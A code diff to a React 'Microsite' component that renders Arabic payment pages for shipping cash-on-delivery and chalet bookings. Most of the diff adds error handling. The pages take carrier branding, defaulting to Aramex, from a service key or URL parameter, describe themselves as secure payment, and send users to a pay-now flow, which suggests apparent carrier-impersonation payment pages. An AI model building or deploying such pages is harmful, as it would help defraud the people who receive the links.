@@ -26,11 +26,23 @@ const Microsite = () => {
   const { country, type, id } = useParams();
   const navigate = useNavigate();
   const { data: link, isLoading, error, isError } = useLink(id);
-  const countryData = getCountryByCode(country || "");
+  
+  // Safely get country data
+  let countryData;
+  try {
+    countryData = getCountryByCode(country || "");
+  } catch (err) {
+    console.error('Error getting country data:', err);
+    countryData = null;
+  }
   
   // Log for debugging
   React.useEffect(() => {
-    console.log('Microsite render:', { country, type, id, isLoading, isError, hasLink: !!link, hasError: !!error });
+    try {
+      console.log('Microsite render:', { country, type, id, isLoading, isError, hasLink: !!link, hasError: !!error });
+    } catch (err) {
+      console.error('Error in useEffect:', err);
+    }
   }, [country, type, id, isLoading, isError, link, error]);
   
   if (isLoading) {
@@ -87,7 +99,7 @@ const Microsite = () => {
     );
   }
   
-  if (!link || !countryData) {
+  if (!link) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
         <Card className="max-w-md mx-4 p-8 text-center">
@@ -101,58 +113,108 @@ const Microsite = () => {
     );
   }
   
+  // If country data is missing, continue with defaults
+  if (!countryData) {
+    console.warn('Country data not found for:', country);
+  }
+  
   // Safely extract payload with defaults
-  const payload = link.payload || {};
+  let payload: any = {};
+  let isShipping = false;
+  let serviceName = 'خدمة الشحن';
+  let serviceKey = 'aramex';
+  let serviceBranding: any = null;
+  let serviceDescription = 'خدمة شحن - نظام دفع آمن ومحمي';
+  let displayName = 'شحنة';
+  let seoTitle = 'تتبع وتأكيد الدفع';
+  let seoDescription = 'تتبع شحنتك وأكمل الدفع بشكل آمن';
+  let seoImage = '/og-aramex.jpg';
   
-  // Determine if it's a shipping or chalet link FIRST
-  const isShipping = link.type === 'shipping';
-  
-  // Get service branding for SEO and display with safe defaults
-  const serviceName = isShipping 
-    ? (payload.service_name || payload.service_key || 'خدمة الشحن')
-    : (payload.chalet_name || 'شاليه');
-  const serviceKey = payload.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceBranding = getServiceBranding(serviceKey);
-  
-  // Update URL to include service information for better SEO
-  React.useEffect(() => {
-    const currentUrl = new URL(window.location.href);
-    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
-      currentUrl.searchParams.set('service', serviceKey);
-      window.history.replaceState({}, '', currentUrl.toString());
+  try {
+    payload = link?.payload || {};
+    isShipping = link?.type === 'shipping';
+    
+    // Get service branding for SEO and display with safe defaults
+    serviceName = isShipping 
+      ? (payload.service_name || payload.service_key || 'خدمة الشحن')
+      : (payload.chalet_name || 'شاليه');
+    
+    try {
+      serviceKey = payload.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+      serviceBranding = getServiceBranding(serviceKey);
+    } catch (err) {
+      console.error('Error getting service branding:', err);
+      serviceBranding = getServiceBranding('aramex'); // Fallback
     }
-  }, [isShipping, serviceKey]);
+    
+    // Update URL to include service information for better SEO
+    React.useEffect(() => {
+      try {
+        const currentUrl = new URL(window.location.href);
+        if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
+          currentUrl.searchParams.set('service', serviceKey);
+          window.history.replaceState({}, '', currentUrl.toString());
+        }
+      } catch (err) {
+        console.error('Error updating URL:', err);
+      }
+    }, [isShipping, serviceKey]);
+    
+    // Get service description from gccShippingServices
+    try {
+      if (gccShippingServices && typeof gccShippingServices === 'object') {
+        const allServices = Object.values(gccShippingServices).flat();
+        const serviceData = allServices.find((s: any) => s?.key === serviceKey);
+        if (serviceData?.description) {
+          serviceDescription = serviceData.description;
+        }
+      }
+    } catch (err) {
+      console.error('Error getting service description:', err);
+      // Keep default description
+    }
+    
+    displayName = isShipping 
+      ? `شحنة ${serviceName}` 
+      : (payload.chalet_name || 'شاليه');
+    
+    // SEO metadata
+    seoTitle = isShipping 
+      ? `تتبع وتأكيد الدفع - ${serviceName}` 
+      : `حجز شاليه - ${payload.chalet_name || 'شاليه'}`;
+    
+    seoDescription = isShipping
+      ? `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
+      : `احجز ${payload.chalet_name || 'شاليه'} في ${countryData?.nameAr || 'الدولة'} - ${payload.nights || 1} ليلة لـ ${payload.guest_count || 2} ضيف`;
+    
+    seoImage = serviceBranding?.ogImage || serviceBranding?.heroImage || '/og-aramex.jpg';
+  } catch (err) {
+    console.error('Error processing link data:', err);
+    // Use safe defaults already set above
+  }
   
-  // Get service description from gccShippingServices
-  const allServices = Object.values(gccShippingServices).flat();
-  const serviceData = allServices.find(s => s.key === serviceKey);
-  const serviceDescription = serviceData?.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
-  
-  const displayName = isShipping 
-    ? `شحنة ${serviceName}` 
-    : (payload.chalet_name || 'شاليه');
-  
-  // SEO metadata
-  const seoTitle = isShipping 
-    ? `تتبع وتأكيد الدفع - ${serviceName}` 
-    : `حجز شاليه - ${payload.chalet_name || 'شاليه'}`;
-  const seoDescription = isShipping
-    ? `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
-    : `احجز ${payload.chalet_name || 'شاليه'} في ${countryData.nameAr} - ${payload.nights || 1} ليلة لـ ${payload.guest_count || 2} ضيف`;
-  const seoImage = serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
-  
-  return (
-    <>
-      <SEOHead 
-        title={seoTitle}
-        description={seoDescription}
-        image={seoImage}
-        url={window.location.href}
-        type="website"
-        serviceName={serviceName}
-        serviceDescription={serviceDescription}
-      />
-      <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+  // Safely get current URL
+  let currentUrl = '';
+  try {
+    currentUrl = window.location.href;
+  } catch (err) {
+    console.error('Error getting URL:', err);
+    currentUrl = '';
+  }
+
+  try {
+    return (
+      <>
+        <SEOHead 
+          title={seoTitle}
+          description={seoDescription}
+          image={seoImage}
+          url={currentUrl}
+          type="website"
+          serviceName={serviceName}
+          serviceDescription={serviceDescription}
+        />
+        <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
         <div className="max-w-4xl mx-auto">
           {/* Header Badge */}
@@ -169,13 +231,15 @@ const Microsite = () => {
             <div
               className="h-32 relative"
               style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
+                background: countryData 
+                  ? `linear-gradient(135deg, ${countryData.primaryColor || '#0EA5E9'}, ${countryData.secondaryColor || '#06B6D4'})`
+                  : 'linear-gradient(135deg, #0EA5E9, #06B6D4)',
               }}
             >
               <div className="absolute inset-0 bg-black/20" />
               <div className="absolute bottom-4 right-6 text-white">
                 <h1 className="text-3xl font-bold">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</h1>
-                <p className="text-lg opacity-90">{countryData.nameAr}</p>
+                <p className="text-lg opacity-90">{countryData?.nameAr || country || 'الدولة'}</p>
               </div>
             </div>
             
@@ -241,7 +305,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">مبلغ الدفع</p>
                         <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.cod_amount || 0, countryData.currency)}
+                          {formatCurrency(payload.cod_amount || 0, countryData?.currency || 'ر.س')}
                         </p>
                       </div>
                     </div>
@@ -283,7 +347,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">السعر / الليلة</p>
                         <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.price_per_night || 0, countryData.currency)}
+                          {formatCurrency(payload.price_per_night || 0, countryData?.currency || 'ر.س')}
                         </p>
                       </div>
                     </div>
@@ -295,7 +359,7 @@ const Microsite = () => {
               <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                 <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
                 <p className="text-5xl font-bold mb-2">
-                  {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData.currency)}
+                  {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData?.currency || 'ر.س')}
                 </p>
                 <p className="text-sm opacity-80">
                   {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night || 0} × ${payload.nights || 1} ليلة`}
@@ -328,7 +392,15 @@ const Microsite = () => {
               <Button
                 size="lg"
                 className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
-                onClick={() => navigate(`/pay/${link.id}/recipient`)}
+                onClick={() => {
+                  try {
+                    if (link?.id) {
+                      navigate(`/pay/${link.id}/recipient`);
+                    }
+                  } catch (err) {
+                    console.error('Error navigating:', err);
+                  }
+                }}
               >
                 <CreditCard className="w-6 h-6 ml-3" />
                 <span>ادفع الآن</span>
@@ -343,7 +415,21 @@ const Microsite = () => {
       </div>
     </div>
     </>
-  );
+    );
+  } catch (renderError) {
+    console.error('Error rendering Microsite:', renderError);
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <Card className="max-w-md mx-4 p-8 text-center">
+          <h2 className="text-2xl font-bold mb-2 text-foreground">حدث خطأ في تحميل الصفحة</h2>
+          <p className="text-muted-foreground mb-4">يرجى المحاولة مرة أخرى</p>
+          <Button variant="outline" onClick={() => navigate("/")}>
+            العودة للرئيسية
+          </Button>
+        </Card>
+      </div>
+    );
+  }
 };
 
 export default Microsite;
